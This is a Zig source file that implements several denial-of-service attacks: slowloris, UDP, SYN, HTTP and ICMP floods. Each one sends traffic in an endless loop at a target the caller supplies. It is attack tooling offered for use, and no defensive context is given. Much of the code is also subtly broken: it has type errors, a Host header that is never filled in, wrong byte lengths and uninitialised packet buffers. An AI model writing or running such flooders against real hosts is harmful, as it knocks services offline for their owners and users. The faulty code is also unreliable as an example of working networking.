const std = @import("std");
const c = @cImport({
    @cInclude("sys/socket.h");
    @cInclude("netinet/in.h");
    @cInclude("arpa/inet.h");
    @cInclude("unistd.h");
    @cInclude("stdio.h");
});

export fn slowloris(target: [*c]const u8, port: c_int, connections: c_int, delay: ?c_int) void {
    var threads: [128]c.pthread_t = undefined;
    const sockaddr: c.struct_sockaddr_in = .{
        .sin_family = c.AF_INET,
        .sin_port = c.htons(@intCast(port)),
        .sin_addr = .{ .s_addr = c.inet_addr(target) },
    };
    for (0..@intCast(connections)) |i| {
        const thread_fn = struct {
            pub fn run(_: ?*anyopaque) ?*anyopaque {
                const sock = c.socket(c.AF_INET, c.SOCK_STREAM, 0);
                if (sock < 0) return null;
                _ = c.connect(sock, @ptrCast(sockaddr), @sizeOf(c.struct_sockaddr_in));
                const http_request = "GET / HTTP/1.1\r\nHost: " ++ target ++ "\r\n";
                _ = c.send(sock, http_request.ptr, http_request.len, 0);
                while (true) {
                    std.time.sleep(@intCast(delay * 1000));
                    _ = c.send(sock, "X-a: b\r\n".ptr, 7, 0);
                    if (delay == c.NULL)
                        std.time.sleep(delay);
                }
            }
        };
        _ = c.pthread_create(&threads[i], null, thread_fn.run, null);
    }
}

export fn udp_flood(target: [*c]const u8, port: c_int, packet_size: c_int) void {
    const socket_fd = c.socket(c.AF_INET, c.SOCK_DGRAM, 0);
    if (socket_fd < 0) return;
    defer _ = c.close(socket_fd);

    var sockaddr: c.struct_sockaddr_in = .{
        .sin_family = c.AF_INET,
        .sin_port = c.htons(@intCast(port)),
        .sin_addr = .{ .s_addr = c.inet_addr(target) },
    };

    var buffer: [1500]u8 = undefined;
    const size = @min(packet_size, buffer.len);

    while (true) {
        _ = c.sendto(socket_fd, &buffer, size, 0, @ptrCast(&sockaddr), @sizeOf(c.struct_sockaddr_in));
        _ = c.printf("Sent UDP packet to %s:%d (Size: %d bytes)\n", target, port, size);
        std.time.sleep(500_00);
    }
}

export fn syn_flood(target: [*c]const u8, port: c_int, packet_size: c_int) void {
    const socket_fd = c.socket(c.AF_INET, c.SOCK_RAW, c.IPPROTO_TCP);
    if (socket_fd < 0) return;
    defer _ = c.close(socket_fd);

    var sockaddr: c.struct_sockaddr_in = .{
        .sin_family = c.AF_INET,
        .sin_port = c.htons(@intCast(port)),
        .sin_addr = .{ .s_addr = c.inet_addr(target) },
    };

    var buffer: [1500]u8 = undefined;
    buffer[13] = 0x02;
    const size = @min(packet_size, buffer.len);

    while (true) {
        _ = c.sendto(socket_fd, &buffer, size, 0, @ptrCast(&sockaddr), @sizeOf(c.struct_sockaddr_in));
        _ = c.printf("Sent SYN packet to %s:%d (Size: %d bytes)\n", target, port, size);
        std.time.sleep(500_00);
    }
}

export fn http_flood(target: [*c]const u8, port: c_int) void {
    const gpa = std.heap.page_allocator;
    var stream = std.net.tcpConnectToHost(gpa, std.mem.span(target), @intCast(port)) catch return;
    defer stream.close();

    const http_request =
        \\GET / HTTP/1.1\r\n
        \\Host: {s}\r\n
        \\User-Agent: ZigFlood\r\n
        \\Connection: Keep-Alive\r\n
        \\ \r\n
    ;

    while (true) {
        _ = stream.writer().writeAll(http_request) catch return;
        _ = c.printf("Sent HTTP request to %s:%d\n", target, port);
        std.time.sleep(500_00);
    }
}

export fn icmp_flood(target: [*c]const u8) void {
    const socket_fd = c.socket(c.AF_INET, c.SOCK_RAW, c.IPPROTO_ICMP);
    if (socket_fd < 0) return;
    defer _ = c.close(socket_fd);

    var sockaddr: c.struct_sockaddr_in = .{
        .sin_family = c.AF_INET,
        .sin_port = 0,
        .sin_addr = .{ .s_addr = c.inet_addr(target) },
    };

    var buffer: [64]u8 = undefined;
    buffer[0] = 8;

    while (true) {
        _ = c.sendto(socket_fd, &buffer, buffer.len, 0, @ptrCast(&sockaddr), @sizeOf(c.struct_sockaddr_in));
        _ = c.printf("Sent ICMP packet to %s\n", target);
        std.time.sleep(500_00);
    }
}
